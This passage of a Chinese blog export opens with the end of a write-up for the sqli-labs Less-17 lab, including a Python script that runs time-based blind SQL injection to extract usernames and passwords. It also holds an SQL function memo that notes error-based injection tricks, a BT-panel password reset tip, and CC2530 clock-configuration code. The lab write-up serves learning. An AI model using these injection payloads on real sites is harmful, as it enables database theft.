  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="4.5" color="#FFFF00">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Bug off you Silly Dumb hacker";</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap1.jpg"   />'</span><span class="token punctuation">;</span>
	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>python</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*."</span>
url <span class="token operator">=</span> <span class="token string">"http://192.168.184.1:801/sqli/Less-17/"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
        <span class="token comment">#1' where username='admin' and if(mid((select database()),1,1)= 's',sleep(3),1)#</span>
        <span class="token comment">#1' where username='admin' and if(mid((select  database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>
        <span class="token comment">#1' where username='admin' and if(mid((select group_concat(table_name,'') from information_schema.tables where table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>
        <span class="token comment">#1' where username='admin' and if(mid((select group_concat(column_name,'') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>
        <span class="token comment">#1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#</span>
        flag <span class="token operator">=</span> <span class="token string">"1' where username='admin' and if(substr((select * from (select GROUP_CONCAT(BINARY(username),',',BINARY(password)) from users) as temp),&#123;&#125;,1)= '&#123;&#125;',sleep(3),1)#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"passwd"</span><span class="token punctuation">:</span>flag<span class="token punctuation">,</span><span class="token string">"submit"</span><span class="token punctuation">:</span><span class="token string">"submit"</span><span class="token punctuation">&#125;</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        <span class="token comment">#print("&#123;&#125;".format(r.status_code))</span>
        <span class="token keyword">if</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<p>加上<code>where username=&#39;admin&#39;</code>是为了减少爆破时间，因为在改<code>password</code>的时候就只会改<code>admin</code>的<code>password</code>了，如果不加上亦可，不加上的话会将所有的<code>password</code>都改为<code>1</code>，但也达到了目的，在最后爆破字段的时候采用了一个虚表<code>temp</code>，因为<code>update</code>操作和<code>select</code>操作都作用于一张表，且会报错：<code>Table &#39;test&#39; is specified twice, both as a target for &#39;UPDATE&#39; and as a separate source for data</code>所以采用虚表进行盲注，且使用了<code>BINARY</code>函数来区分表中内容的大小写</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
        <tag>SQL</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一次有惊无险！！！</title>
    <url>/posts/53c288d6/</url>
    <content><![CDATA[<p>莫名其妙的phpmyadmin就进不去了，一直密码错误，在bt里面改密码也进不去，搞的后来差一点删除数据库</p>
<p>解决方法：</p>
<p>修改数据库密码：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /www/server/panel <span class="token operator">&amp;&amp;</span> python tools.pyc root xxx</code></pre>

<p>修改bt面板的密码：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /www/server/panel <span class="token operator">&amp;&amp;</span> python tools.pyc panel xxx</code></pre>

<span id="more"></span>

<p>xxx处写修改你的数据库密码或bt密码</p>
<p>注意，修改完密码后访问wp博客会显示数据库连接错误，这时在wp-config.php中修改你的MySQL数据库密码就行啦！</p>
<p>附上参考原文<a href="https://www.xqblog.com/12973.html">链接</a></p>
<p>感谢！</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E6%9C%89%E6%83%8A%E6%97%A0%E9%99%A9%EF%BC%81%EF%BC%81%EF%BC%81/55667523_p0_master1200.jpg" alt loading="lazy"></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>关于SQL中的一些函数（备忘）</title>
    <url>/posts/cf51e998/</url>
    <content><![CDATA[<h3 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a><strong>SQL Server</strong></h3><h4 id="STUFF"><a href="#STUFF" class="headerlink" title="STUFF"></a>STUFF</h4><p>character_expression：一个字符数据表达式，可以是常量，变量，也可以是字符列或二级制数据列</p>
<p>start：一个重整数值，指定要删除和插入的开始位置，如果start或length为负，则返回空字符串。如果start比第一个character_expression长，则返回空字符串。start可以是big int型。</p>
<p>length：一个整数，指定要删除的字符串。如果length比第一个character_expression长，则最多删除到最后一个character_expression中的最后一个字符。length可以是big int类型。</p>
<p>返回类型：如果character_expression是受支持的字符数据类型，则返回字符数据。如果character_expression是一个受支持的binary数据类型，则返回二进制数据。</p>
<p>例如：</p>
<p>以下示例在第一个字符串 abcdef 中删除从第 2 个位置（字符 b）开始的三个字符，然后在删除的起始位置插入第二个字符串，从而创建并返回一个字符串。</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> STUFF<span class="token punctuation">(</span><span class="token string">'abcdef'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'ijklmn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
结果：aijklmnef</code></pre>

<h4 id="FOR-XML-PATH"><a href="#FOR-XML-PATH" class="headerlink" title="FOR XML PATH"></a>FOR XML PATH</h4><p>通常与stuff函数结合起来使用， 将查询结果集以<a href="https://baike.baidu.com/item/%E5%8F%AF%E6%89%A9%E5%B1%95%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/2885849?fromtitle=xml&fromid=86251&fr=aladdin">XML</a>形式展现</p>
<p>现有表</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-107.png" alt loading="lazy"></p>
<p>执行</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> stuff<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">','</span><span class="token operator">+</span>test_name<span class="token operator">+</span>test_pass <span class="token keyword">from</span> test <span class="token keyword">for</span> xml path<span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-108.png" alt loading="lazy"></p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> stuff<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token string">','</span><span class="token operator">+</span>test_name<span class="token operator">+</span>test_pass <span class="token keyword">from</span> test <span class="token keyword">for</span> xml path<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-109.png" alt loading="lazy"></p>
<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><strong>MySQL</strong></h3><h4 id="Concat"><a href="#Concat" class="headerlink" title="Concat"></a>Concat</h4><p>返回结果为连续参数产生的字符串。如果任何一个参数为NULL，则返回值为NULL。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-138.png" alt loading="lazy"></p>
<h4 id="Concat-ws"><a href="#Concat-ws" class="headerlink" title="Concat_ws"></a>Concat_ws</h4><p>concat_ws()代表concat with separator ，是concat的特殊形式。第一个参数是其它参数的分隔符，如果分隔符为NULL，则结果为NULL</p>
<p>函数返回结果为连接参数产生的字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-139.png" alt loading="lazy"></p>
<h4 id="Group-concat"><a href="#Group-concat" class="headerlink" title="Group_concat"></a>Group_concat</h4><p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])</p>
<p>将同一个分组中的值连接起来，返回一个字符串结果。</p>
<p>通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203144159549.png" alt loading="lazy"></p>
<h4 id="Updatexml"><a href="#Updatexml" class="headerlink" title="Updatexml"></a>Updatexml</h4><ul>
<li>XML_document：String格式，为XML文档对象的名称</li>
<li>XPath_string：XPath格式的字符串</li>
<li>new_value：String格式，替换查找到的符合条件的数据</li>
</ul>
<p>SQL注入通常用于显错注入；XPath_string出参数错误报错，得到信息，方法：</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">updatexml(1,concat(1,(SELECT database())),1);</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-141.png" alt loading="lazy"></p>
<h4 id="Extractvalue"><a href="#Extractvalue" class="headerlink" title="Extractvalue"></a>Extractvalue</h4><ul>
<li><p>XML_document：String格式，为XML文档对象的名称</p>
</li>
<li><p>XPath_string：Xpath格式的字符串</p>
<p>extractvalue(1,concat(1,database()));</p>
</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-142.png" alt loading="lazy"></p>
<h4 id="Left-Right"><a href="#Left-Right" class="headerlink" title="Left/Right"></a>Left/Right</h4><p>此函数返回ARG最左边，右边的LENGTH个字符串，ARG可是char或binary，string</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-143.png" alt loading="lazy"></p>
<h4 id="Substr"><a href="#Substr" class="headerlink" title="Substr"></a>Substr</h4><ul>
<li>string：需要截取的字符串</li>
<li>start：开始截取的位置</li>
<li>length：需要截取字符串的个数，若无此项，则从截取位置一直截取到最后</li>
</ul>
<p>必要的时候可以不用逗号用<code>from</code>和<code>for</code>代替，<code>substr(string from start for length)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-152.png" alt loading="lazy"></p>
<h4 id="Ascii"><a href="#Ascii" class="headerlink" title="Ascii"></a>Ascii</h4><p>返回字符串str的最左字符的数值。返回0，如果str为空字符串。返回NULL，如果str为NULL。 ASCII()返回数值是从0到255。</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-166.png" alt loading="lazy"></p>
<h4 id="Pow"><a href="#Pow" class="headerlink" title="Pow"></a>Pow</h4><p>pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200203151717577.png" alt loading="lazy"></p>
<h4 id="MID"><a href="#MID" class="headerlink" title="MID"></a>MID</h4><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224203301659.png" alt loading="lazy"></p>
<p>必要的时候可以不用逗号用<code>from</code>和<code>for</code>代替，<code>mid(string from start for length)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200224204817021.png" alt loading="lazy"></p>
<h4 id="Like"><a href="#Like" class="headerlink" title="Like"></a>Like</h4><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p>
<p>支持通配符匹配，like有两个模式：<code>_</code>和<code>%</code></p>
<p><strong>_</strong>：表示单个字符，<strong>%</strong>：表示0个或多个任意字符</p>
<p>例如：<code>name,%,%e,n%,%a%,_ame,____,_%_</code>都匹配<code>name</code>这个字符</p>
<h4 id="Rlike-Regexp"><a href="#Rlike-Regexp" class="headerlink" title="Rlike/Regexp"></a>Rlike/Regexp</h4><p><code>rlike==regexp</code>  都是正则匹配，特殊字符需要进行适当的反斜杠转义</p>
<h4 id="INSTR"><a href="#INSTR" class="headerlink" title="INSTR"></a>INSTR</h4><p><strong>C1</strong>：表示被搜索的字符串</p>
<p><strong>C2</strong>：希望搜索的字符串</p>
<p><strong>I</strong>：搜索的开始位置，默认为1</p>
<p><strong>J</strong>：出现的位置，默认为1</p>
<p>返回值为匹配开始的位置，sql中第一个字符的位置为1</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503180526297.png" alt loading="lazy"></p>
<h4 id="IF"><a href="#IF" class="headerlink" title="IF"></a>IF</h4><p>如果<strong>expr1</strong>是<strong>TRUE(expr1&lt;&gt;0 and expr1&lt;&gt;NULL)</strong>，则语句发返回值为<strong>expr2</strong>，否则返回<strong>expr3</strong></p>
<p>另外还有一种写法：<code>case when expr1 then expr2 else expr3</code></p>
<h4 id="limit-i-n"><a href="#limit-i-n" class="headerlink" title="limit i,n"></a>limit i,n</h4><p><strong>i</strong>：为查询结果的索引值，默认从0开始</p>
<p><strong>n</strong>：为从第<strong>i</strong>条开始之后的<strong>n</strong>条记录</p>
<h4 id="set-prepare-from-execute"><a href="#set-prepare-from-execute" class="headerlink" title="set prepare from execute"></a>set prepare from execute</h4><p><strong>sql</strong>：为要执行的sql语句，可以将其化为十六进制后传入饶过单引号限制</p>
<p><strong>table</strong>：为执行sql语句的表</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214904653.png" alt loading="lazy"></p>
<h4 id="BINARY"><a href="#BINARY" class="headerlink" title="BINARY"></a>BINARY</h4><p>SQL语句中默认是不区分大小写，在sql语句中加上<strong>binary</strong>即可区分</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214747191.png" alt loading="lazy"></p>
<h4 id="CAST"><a href="#CAST" class="headerlink" title="CAST"></a>CAST</h4><p>转换任意类型<strong>expr</strong>为指定的<strong>type</strong>类型</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%85%B3%E4%BA%8ESQL%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/image-20200503214604050.png" alt loading="lazy"></p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>时钟，串口配置</title>
    <url>/posts/11ef9369/</url>
    <content><![CDATA[<h1 id="切换系统高频时钟源"><a href="#切换系统高频时钟源" class="headerlink" title="切换系统高频时钟源"></a>切换系统高频时钟源</h1><p>CC2530在正常运行的时候需要一个高频时钟信号和一个低频的时钟信号</p>
<ul>
<li>高频时钟信号：主要供给给CPU，保证程序的运行</li>
<li>低频时钟信号：主要供给看门狗，睡眠定时器等偏上外设</li>
</ul>
<p>时钟信号来源</p>
<ul>
<li>高频信号两个来源：芯片内部的16M RC电路；外接的32M石英晶振</li>
<li>低频信号两个来源：芯片内部的32K RC电路，外接的32.768K石英晶振</li>
</ul>
<span id="more"></span>

<p>CC2530默认上电的时候，是内部的2个RC电路作为高频和低频的时钟来源</p>
<p>如果我们在用串口，特别是无线通信的时候，必须要用32M的石英晶振作为高频时钟来源，16M比32M的速度慢，为32M的1/2</p>
<p>高频时钟源特点：</p>
<ul>
<li>两个高频时钟源可以同时起振产生高频时钟信号</li>
<li>而两个低频时钟源，某一时刻只能有1个起振，并且起振能的这个时钟源供给CC2530</li>
</ul>
<p>切换步骤：</p>
<p>1、2个高频时钟源起振； 让SLEEPCMD的第2位为0；</p>
<pre class="language-c" data-language="c"><code class="language-c">SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 开启2个高频时钟源</span></code></pre>

<p>2、待目标时钟源振荡稳定；SLEEPSTA寄存器的第6位为1表示32 时钟源稳定</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 等待32M稳定</span></code></pre>

<p>3、 延时一小段时间63us（不定）； 超过63微秒延时</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">delayus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//调用函数实现</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> k<span class="token operator">=</span><span class="token number">63</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>4、不分频输出； 把寄存器CLKCONCMD的低3位 设置为000，表示不分频输出</p>
<pre class="language-c" data-language="c"><code class="language-c">CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 不分频输出</span></code></pre>

<p>5、 选中目标高频时钟源作为系统主时钟； 把寄存器CLKCONCMD的第6位 清0，设置32M作为系统主时钟</p>
<pre class="language-c" data-language="c"><code class="language-c">CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 设置32M作为系统主时钟</span></code></pre>

<p>6、确认一下当前工作的系统时钟是不是所选的高频时钟；如果读CLKCONSTA这个寄存器的第6位为0，表示32M的时钟源已经作为了当前的系统主时钟，程序可以往下运行了。</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 等待32M成功成为当前系统主时钟</span></code></pre>

<h1 id="数码管测试"><a href="#数码管测试" class="headerlink" title="数码管测试"></a>数码管测试</h1><p>32M代码：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span>
<span class="token keyword">void</span> <span class="token function">delayus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> k<span class="token operator">=</span><span class="token number">63</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>
     <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
       <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">800</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 开启2个高频时钟源</span>
   <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 等待32M稳定</span>
   <span class="token function">delayus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 不分频输出</span>
   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 设置32M作为系统主时钟</span>
   <span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 等待32M成功成为当前系统主时钟</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
     <span class="token keyword">char</span> i<span class="token punctuation">;</span>
     <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
         <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
         <span class="token punctuation">&#123;</span>
            <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//数码管显示函数，i为几，数码管显示几</span>
            <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>16M代码：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iocc2530.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span>
<span class="token keyword">void</span> <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">;</span>
     <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
       <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">800</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
     <span class="token keyword">char</span> i<span class="token punctuation">;</span>
     <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
         <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
         <span class="token punctuation">&#123;</span>
            <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

